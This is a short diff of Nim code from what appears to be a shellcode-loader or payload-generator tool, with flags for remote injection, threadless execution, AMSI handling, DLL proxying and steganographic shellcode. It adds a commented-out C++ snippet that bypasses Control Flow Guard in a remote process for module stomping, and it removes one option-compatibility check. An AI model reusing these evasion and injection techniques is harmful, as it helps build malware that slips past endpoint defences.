@@ -838,11 +838,6 @@ if (((remoteinject == false) and carokann and (useQueueAPC == false and localCre
     quit(1)
 
 
-# InteractivePS cannot be used with --remoteinject
-if (interactivePS and remoteinject):
-    echo "Error: Cannot use --interactivePS with --remoteinject!"
-    quit(1)
-
 # Cannot use DripAllocate or JmpEntry with Caro-Kann
 if ((carokann and dripallocate) or (carokann and jmpEntry)):
     echo "Error: Cannot use --Caro-Kann with --dripallocate or --jmpEntry (yet)!"
@@ -2203,6 +2198,24 @@ when defined(Stego):
             shellcode: seq[byte] = extractBytes(c, a)
         return shellcode
 
+
+#[ alternative to disable CFG https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/
+if (srcSect.Characteristics & IMAGE_SCN_MEM_EXECUTE)
+{
+for (unsigned int n = 0; n < srcSect.VirtualSize; n += 16)
+targetModule.markCFGValid(n);
+}
+void markCFGValid(unsigned long long ptrToMarkValid)
+{
+CFG_CALL_TARGET_INFO info;
+info.Flags = CFG_CALL_TARGET_VALID;
+info.Offset = ptrToMarkValid;
+
+if (!SetProcessValidCallTargets_(targetProcess, targetModuleBase, sizeOfImage, 1, &info))
+throw std::exception("SetProcessValidCallTargets failed");
+}
+
+]#
 var cfgspawn: bool = false
 
 when defined(threadless):
@@ -3701,7 +3714,8 @@ if(AMSI and oneShot):
     basicCompileFlags.add("-d:oneshot ")
 
 if (dllProxy):
-    basicCompileFlags.add("--mm:none --threads:on ")
+    basicCompileFlags.add("--mm:none --threads:on ") # ORC breaks compilation with new anti Emulation checks
+
     basicCompileFlags.add("-d:proxy ")
 
 if(service):
